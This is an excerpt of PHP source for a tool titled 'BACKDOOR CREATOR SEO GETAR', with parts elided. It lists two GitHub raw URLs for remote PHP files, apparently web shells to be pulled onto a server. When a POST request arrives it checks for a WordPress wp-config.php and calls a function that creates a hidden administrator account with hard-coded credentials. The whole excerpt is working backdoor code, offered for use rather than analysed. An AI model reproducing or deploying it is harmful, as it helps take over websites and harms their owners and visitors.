...
$url1 = 'https://raw.githubusercontent.com/masihpemula88/masihpemula88/refs/heads/main/vimpatior.php';
$url2 = 'https://raw.githubusercontent.com/masihpemula88/masihpemula88/refs/heads/main/bloodseeker.php';
...
echo "<!DOCTYPE html>
<html>
<title>BACKDOOR CREATOR SEO GETAR</title>
<p>SEO GETAR BOS!</p>
<head>
    <style>
        body {
...
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (file_exists($rootDir . '/wp-config.php')) {
        ...
        create_wp_admin_user($rootDir, 'Shadow-Here', 'ShadowIsNotYourFriends_@xx1');
    } else {
